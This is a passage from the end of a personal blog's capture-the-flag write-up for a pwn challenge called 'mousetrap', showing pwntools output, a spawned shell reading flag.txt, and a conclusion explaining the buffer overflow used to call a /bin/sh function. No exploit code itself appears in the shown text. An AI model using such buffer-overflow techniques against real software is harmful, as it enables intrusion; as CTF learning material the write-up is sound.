<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">'/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/libc.so.6'</span>
    <span class="nx">Arch</span><span class="o">:</span>     <span class="nx">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="nx">little</span>
    <span class="nx">RELRO</span><span class="o">:</span>    <span class="nx">Partial</span> <span class="nx">RELRO</span>
    <span class="nx">Stack</span><span class="o">:</span>    <span class="nx">Canary</span> <span class="nx">found</span>
    <span class="nx">NX</span><span class="o">:</span>       <span class="nx">NX</span> <span class="nx">enabled</span>
    <span class="nx">PIE</span><span class="o">:</span>      <span class="nx">PIE</span> <span class="nx">enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Starting</span> <span class="nx">local</span> <span class="nx">process</span> <span class="s1">'/usr/bin/gdbserver'</span><span class="o">:</span> <span class="nx">pid</span> <span class="mi">14089</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">running</span> <span class="nx">in</span> <span class="k">new</span> <span class="nx">terminal</span><span class="o">:</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">gdb</span> <span class="o">-</span><span class="nx">q</span>  <span class="s2">"./mousetrap"</span> <span class="o">-</span><span class="nx">x</span> <span class="s2">"/tmp/pwnQRen2_.gdb"</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Switching</span> <span class="nx">to</span> <span class="nx">interactive</span> <span class="nx">mode</span>
<span class="nx">Detaching</span> <span class="nx">from</span> <span class="nx">process</span> <span class="mi">14105</span>
<span class="err">$</span> <span class="nx">ls</span>
<span class="nx">flag</span><span class="o">.</span><span class="nx">txt</span>
<span class="nx">mousetrap</span>
<span class="err">$</span> <span class="nx">cat</span> <span class="nx">flag</span><span class="o">.</span><span class="nx">txt</span>
<span class="nx">flag</span><span class="p">{</span><span class="nx">C0nTr0l_S1Z3_4_</span><span class="nv">$h3LL</span><span class="p">}</span>
</code></pre></div></div>

<h2 id="conclusion-">Conclusion:-</h2>

<p>This challenge include a simple Buffer overflow(BoF) task and had to call a function <code class="highlighter-rouge">cheeeeeeeese</code> where <code class="highlighter-rouge">/bin/sh</code> was located instead of providing our global offset of <code class="highlighter-rouge">/bin/sh</code>.</p>

<p>Stay updated to my blog, I will be posting next writeup soon. I started writing a series of <code class="highlighter-rouge">Exploitation &amp; Pwning</code> posts as this is my first post of this series here I explained about BoF. At last but not least I like to thank my friend <code class="highlighter-rouge">Linuz</code> for helping me out.</p>

<p>I would like to thank all my reader. Feedback Really appreciated in comment below.</p>

<p>Stay Safe</p>

<p>Keep Learning</p>


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'gr4n173'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2020/05/16/htb-patents.html">
          Hack The Box: Patents
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/04/18/htb-mango.html">
          Hack The Box: Mango
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/04/17/virseccon-ctf-web.html">
           VirSecCon CTF: Web Challenges
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/.chm/" class="set-1">.chm</a> <a href="/tag/bof/" class="set-1">BoF</a> <a href="/tag/explotation%26pwning/" class="set-1">Explotation&Pwning</a> <a href="/tag/invoke/" class="set-1">Invoke</a> <a href="/tag/lfi-posioning/" class="set-1">LFI-posioning</a> <a href="/tag/nosql/" class="set-1">Nosql</a> <a href="/tag/phpjuggler/" class="set-1">PhpJuggler</a> <a href="/tag/powershell/" class="set-1">Powershell</a> <a href="/tag/re/" class="set-1">RE</a> <a href="/tag/rop/" class="set-1">ROP</a> <a href="/tag/smb/" class="set-1">SMB</a> <a href="/tag/ssti/" class="set-1">SSTI</a> <a href="/tag/vscctf/" class="set-2">VSCCTF</a> <a href="/tag/virseccon/" class="set-2">VirSecCon</a> <a href="/tag/xxe/" class="set-1">XXE</a> <a href="/tag/binaryexploitation/" class="set-1">binaryexploitation</a> <a href="/tag/boltcms/" class="set-1">boltcms</a> <a href="/tag/csrftorce/" class="set-1">csrftorce</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/ffuf/" class="set-1">ffuf</a> <a href="/tag/ftp/" class="set-2">ftp</a> <a href="/tag/fuzz/" class="set-1">fuzz</a> <a href="/tag/gdb/" class="set-1">gdb</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/hackpackctf/" class="set-1">hackpackctf</a> <a href="/tag/htb/" class="set-5">htb</a> <a href="/tag/ipv6/" class="set-1">ipv6</a> <a href="/tag/jjs/" class="set-1">jjs</a> <a href="/tag/lfmserver/" class="set-1">lfmserver</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/linxu/" class="set-1">linxu</a> <a href="/tag/lkm/" class="set-1">lkm</a> <a href="/tag/mongodb/" class="set-1">mongodb</a> <a href="/tag/nc.exe/" class="set-1">nc.exe</a> <a href="/tag/nephack3/" class="set-1">nephack3</a> <a href="/tag/nishang/" class="set-1">nishang</a> <a href="/tag/oauth2/" class="set-1">oauth2</a> <a href="/tag/pcap/" class="set-1">pcap</a> <a href="/tag/port-forward/" class="set-1">port-forward</a> <a href="/tag/postgres/" class="set-1">postgres</a> <a href="/tag/pwn/" class="set-2">pwn</a> <a href="/tag/pwnables/" class="set-1">pwnables</a> <a href="/tag/python/" class="set-1">python</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/restic-server/" class="set-1">restic-server</a> <a href="/tag/rsync/" class="set-1">rsync</a> <a href="/tag/scripting/" class="set-1">scripting</a> <a href="/tag/selenium/" class="set-1">selenium</a> <a href="/tag/server/" class="set-1">server</a> <a href="/tag/sqli/" class="set-2">sqli</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/virseccon/" class="set-2">virseccon</a> <a href="/tag/webchallenge/" class="set-1">webchallenge</a> <a href="/tag/webshell/" class="set-1">webshell</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/whoami/" class="set-1">whoami</a> <a href="/tag/whois/" class="set-1">whois</a> <a href="/tag/windows/" class="set-1">windows</a></div>
  




      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
	  <center><script src="https://www.hackthebox.eu/badge/60443"></script> </center><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');
if (theme === 'undefined') {
   theme = "dark";
}
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
} else {
    document.documentElement.setAttribute('data-theme', 'light');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
